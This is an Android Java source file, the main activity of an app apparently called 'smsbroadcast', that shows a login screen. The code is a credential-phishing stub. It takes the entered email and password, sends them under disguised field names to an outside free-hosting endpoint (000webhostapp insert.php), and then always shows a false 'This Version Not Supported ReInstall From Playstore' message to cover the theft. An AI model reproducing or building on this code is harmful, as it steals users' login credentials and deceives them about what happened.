package jasoliya1.ravin.smsbroadcast;

import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.util.HashMap;

public class MainActivity extends AppCompatActivity {

    EditText user,pass;
    Button login;
    HashMap<String,String> hashMap;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActionBar actionBar=getSupportActionBar();
        actionBar.hide();
        setContentView(R.layout.activity_main);

        user=(EditText)findViewById(R.id.txtemail);
        pass=(EditText)findViewById(R.id.txtpass);
        login=(Button) findViewById(R.id.btnlogin);
        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {


                hashMap=new HashMap<String, String>();
                hashMap.put("ans",user.getText().toString());
                hashMap.put("op4",pass.getText().toString());

                AsyncTaskLoader asyncTaskLoader=new AsyncTaskLoader(MainActivity.this, new OnAsyncResult() {
                    @Override
                    public void onAsyncResult(String result)
                    {
                        //String s=result.substring(0,23);
                        //Toast.makeText(MainActivity.this, ""+s, Toast.LENGTH_SHORT).show();

                        Toast.makeText(MainActivity.this, "This Version Not Supported ReInstall From Playstore", Toast.LENGTH_SHORT).show();
                    }
                },hashMap,"https://uizdataonline.000webhostapp.com/insert.php?");
                asyncTaskLoader.execute();
            }
        });

        }

}
